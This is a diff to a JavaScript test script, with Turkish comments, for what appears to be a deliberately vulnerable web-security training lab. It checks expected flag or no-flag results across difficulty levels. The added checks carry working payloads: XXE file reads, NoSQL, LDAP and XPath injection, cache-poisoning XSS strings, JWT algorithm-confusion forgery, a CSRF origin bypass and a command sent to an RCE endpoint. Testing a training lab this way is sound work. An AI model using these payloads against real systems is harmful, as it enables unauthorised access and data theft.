@@ -139,7 +139,8 @@ async function main() {
   }, "flag");
   await run("insecure-randomness", "medium", async () => {
     await F("/insecure-router?action=reset", { method: "POST", level: "medium", body: { email: "admin@ordek.com" } });
-    for (const d of [0, -1, 1, -2, 2]) {
+    // ±4 sn pencere: reset→verify gidiş-dönüşü saniye sınırını aşsa bile tahmin tutar (flaky'i önler).
+    for (const d of [0, -1, 1, -2, 2, -3, 3, -4, 4]) {
       const now = Math.floor(Date.now() / 1000) + d;
       const guess = ((now * 3 + 142) % 100000).toString().padStart(5, "0");
       const v = await F("/insecure-router?action=verify", { method: "POST", level: "medium", body: { email: "admin@ordek.com", token: guess, new_password: "pwned" } });
@@ -250,6 +251,85 @@ async function main() {
   await run("csrf", "low", async () => hasFlag((await F("/csrf", { method: "POST", level: "low", form: { email: "x@evil.com" } })).text, "csrf"), "flag");
   await run("csrf", "medium", async () => hasFlag((await F("/csrf", { method: "POST", level: "medium", form: { email: "x@evil.com" }, headers: { origin: "http://localhost:3000.evil.com" } })).text, "csrf"), "flag");
   await run("csrf", "high", async () => hasFlag((await F("/csrf", { method: "POST", level: "high", form: { email: "x@evil.com" } })).text, "csrf"), "flag"); // token gönderilmez → loose-check bypass
+
+  // 28. nmap-recon /nmap-recon (GET; -p- ile gizli 31337 servisi)
+  await run("nmap-recon", "low", async () => hasFlag((await F("/nmap-recon", { level: "low" })).text, "nmap-recon"), "flag");
+  await run("nmap-recon", "medium", async () => hasFlag((await F("/nmap-recon", { level: "medium" })).text, "nmap-recon"), "noflag"); // varsayılan tarama gizli portu göstermez
+  await run("nmap-recon", "medium", async () => hasFlag((await F("/nmap-recon?ports=all", { level: "medium" })).text, "nmap-recon"), "flag");   // -p- ile bulunur
+  await run("nmap-recon", "high", async () => hasFlag((await F("/nmap-recon?ports=all", { level: "high" })).text, "nmap-recon"), "noflag"); // firewall ile filtered
+
+  // 29. metasploit-rce /metasploit-rce (POST cmd/token; exploit modülü mantığı)
+  await run("metasploit-rce", "low", async () => hasFlag((await F("/metasploit-rce", { method: "POST", level: "low", body: { cmd: "id" } })).text, "metasploit-rce"), "flag");
+  await run("metasploit-rce", "medium", async () => hasFlag((await F("/metasploit-rce", { method: "POST", level: "medium", body: { cmd: "id" } })).text, "metasploit-rce"), "noflag"); // token yok → reddedilir
+  await run("metasploit-rce", "medium", async () => hasFlag((await F("/metasploit-rce", { method: "POST", level: "medium", body: { cmd: "id", token: "VULNSOFT-DEFAULT" } })).text, "metasploit-rce"), "flag"); // sızan token
+  await run("metasploit-rce", "high", async () => hasFlag((await F("/metasploit-rce", { method: "POST", level: "high", body: { cmd: "id", token: "VULNSOFT-DEFAULT" } })).text, "metasploit-rce"), "noflag"); // yamalı
+
+  // ════════════════════════ FAZ 2 — 10 YENİ ZAFİYET ════════════════════════
+  // 30. xxe /xxe (raw XML; harici varlık ile dosya okuma)
+  const xxe = (dt) => `<?xml version="1.0"?>${dt}<invoice><note>&x;</note></invoice>`;
+  const xxeDT = (kw) => `<${kw} r [<!ENTITY x SYSTEM "file:///tmp/xxe_flag.txt">]>`;
+  const xmlH = { "content-type": "application/xml" };
+  await run("xxe", "low", async () => hasFlag((await F("/xxe", { method: "POST", level: "low", headers: xmlH, raw: xxe(xxeDT("!DOCTYPE")) })).text, "xxe"), "flag");
+  await run("xxe", "medium", async () => hasFlag((await F("/xxe", { method: "POST", level: "medium", headers: xmlH, raw: xxe(xxeDT("!doctype")) })).text, "xxe"), "flag"); // küçük harf doctype WAF'ı atlar
+  await run("xxe", "high", async () => hasFlag((await F("/xxe", { method: "POST", level: "high", headers: xmlH, raw: xxe(xxeDT("!DOCTYPE")) })).text, "xxe"), "noflag");
+
+  // 31. nosql-injection /nosql ($ne / $regex operatör enjeksiyonu)
+  await run("nosql-injection", "low", async () => hasFlag((await F("/nosql", { method: "POST", level: "low", body: { username: "admin", password: { $ne: "" } } })).text, "nosql-injection"), "flag");
+  await run("nosql-injection", "medium", async () => hasFlag((await F("/nosql", { method: "POST", level: "medium", body: { username: "admin", password: { $regex: "^.*" } } })).text, "nosql-injection"), "flag");
+  await run("nosql-injection", "high", async () => hasFlag((await F("/nosql", { method: "POST", level: "high", body: { username: "admin", password: { $ne: "" } } })).text, "nosql-injection"), "noflag");
+
+  // 32. graphql-injection /graphql (introspection + yetkisiz alan)
+  const gqUser = '{"query":"{ user(id:1){ username secretNote } }"}';
+  await run("graphql-injection", "low", async () => hasFlag((await F("/graphql", { method: "POST", level: "low", raw: gqUser })).text, "graphql-injection"), "flag");
+  await run("graphql-injection", "medium", async () => hasFlag((await F("/graphql", { method: "POST", level: "medium", raw: gqUser })).text, "graphql-injection"), "flag");
+  await run("graphql-injection", "high", async () => hasFlag((await F("/graphql", { method: "POST", level: "high", raw: gqUser })).text, "graphql-injection"), "noflag");
+
+  // 33. ldap-injection /ldap (filtre enjeksiyonu)
+  await run("ldap-injection", "low", async () => hasFlag((await F("/ldap", { method: "POST", level: "low", form: { username: "*)(uid=*))(|(uid=*", password: "x" } })).text, "ldap-injection"), "flag");
+  await run("ldap-injection", "medium", async () => hasFlag((await F("/ldap", { method: "POST", level: "medium", form: { username: "admin)(&)", password: "x" } })).text, "ldap-injection"), "flag");
+  await run("ldap-injection", "high", async () => hasFlag((await F("/ldap", { method: "POST", level: "high", form: { username: "*)(uid=*))(|(uid=*", password: "x" } })).text, "ldap-injection"), "noflag");
+
+  // 34. xpath-injection /xpath (tautoloji)
+  await run("xpath-injection", "low", async () => hasFlag((await F("/xpath", { method: "POST", level: "low", form: { username: "admin' or '1'='1", password: "x" } })).text, "xpath-injection"), "flag");
+  await run("xpath-injection", "medium", async () => hasFlag((await F("/xpath", { method: "POST", level: "medium", form: { username: 'admin" or "1"="1', password: "x" } })).text, "xpath-injection"), "flag");
+  await run("xpath-injection", "high", async () => hasFlag((await F("/xpath", { method: "POST", level: "high", form: { username: "admin' or '1'='1", password: "x" } })).text, "xpath-injection"), "noflag");
+
+  // 35. http-parameter-pollution /hpp (parametre çoğaltma)
+  await run("http-parameter-pollution", "low", async () => hasFlag((await F("/hpp?role=user&role=admin", { level: "low" })).text, "http-parameter-pollution"), "flag");
+  await run("http-parameter-pollution", "medium", async () => hasFlag((await F("/hpp?role=user&role%5B%5D=admin", { level: "medium" })).text, "http-parameter-pollution"), "flag");
+  await run("http-parameter-pollution", "high", async () => hasFlag((await F("/hpp?role=user&role%5B%5D=admin", { level: "high" })).text, "http-parameter-pollution"), "noflag");
+
+  // 36. web-cache-poisoning /cache-poison (unkeyed X-Forwarded-Host → zehirle, temiz iste)
+  for (const [lvl, xfh, exp] of [
+    ["low", 'x"><img src=x onerror=alert(1)>', "flag"],
+    ["medium", 'x" onmouseover="alert(1)', "flag"],
+    ["high", 'evil"><script>bad()</script>', "noflag"],
+  ]) {
+    await run("web-cache-poisoning", lvl, async () => {
+      await F("/cache-poison?reset=1", { level: lvl });
+      await F("/cache-poison", { level: lvl, headers: { "x-forwarded-host": xfh } }); // saldırgan zehirler
+      return hasFlag((await F("/cache-poison", { level: lvl })).text, "web-cache-poisoning"); // kurban (temiz) alır
+    }, exp);
+  }
+
+  // 37. websocket-tampering /ws-chat (mesaj role/isStaff kurcalama)
+  await run("websocket-tampering", "low", async () => hasFlag((await F("/ws-chat", { method: "POST", level: "low", body: { action: "getSecret", role: "admin" } })).text, "websocket-tampering"), "flag");
+  await run("websocket-tampering", "medium", async () => hasFlag((await F("/ws-chat", { method: "POST", level: "medium", body: { action: "getSecret", isStaff: true } })).text, "websocket-tampering"), "flag");
+  await run("websocket-tampering", "high", async () => hasFlag((await F("/ws-chat", { method: "POST", level: "high", body: { action: "getSecret", role: "admin" } })).text, "websocket-tampering"), "noflag");
+
+  // 38. git-disclosure /git-disclosure (.git / .bak ifşası)
+  await run("git-disclosure", "low", async () => hasFlag((await F("/git-disclosure?path=/config.php.bak", { level: "low" })).text, "git-disclosure"), "flag");
+  await run("git-disclosure", "medium", async () => hasFlag((await F("/git-disclosure?path=/config.php.bak", { level: "medium" })).text, "git-disclosure"), "flag"); // .git kapalı, .bak açık
+  await run("git-disclosure", "high", async () => hasFlag((await F("/git-disclosure?path=/config.php.bak", { level: "high" })).text, "git-disclosure"), "noflag");
+
+  // 39. jwt-alg-confusion /jwt-confusion (RS256→HS256: public key'i HMAC sırrı yap)
+  const forgeAdmin = async () => {
+    const pub = JSON.parse((await F("/jwt-confusion?action=pubkey")).text).publicKey;
+    return hs256({ user: "x", role: "admin" }, pub); // pubkey'i HMAC sırrı olarak imzala
+  };
+  await run("jwt-alg-confusion", "low", async () => hasFlag((await F("/jwt-confusion", { method: "POST", level: "low", body: { token: await forgeAdmin() } })).text, "jwt-alg-confusion"), "flag");
+  await run("jwt-alg-confusion", "medium", async () => hasFlag((await F("/jwt-confusion", { method: "POST", level: "medium", body: { token: await forgeAdmin() } })).text, "jwt-alg-confusion"), "flag");
+  await run("jwt-alg-confusion", "high", async () => hasFlag((await F("/jwt-confusion", { method: "POST", level: "high", body: { token: await forgeAdmin() } })).text, "jwt-alg-confusion"), "noflag");
 
   // ---- flag isolation sanity: panel ana sayfası & bundle flag içermemeli ----
   try {
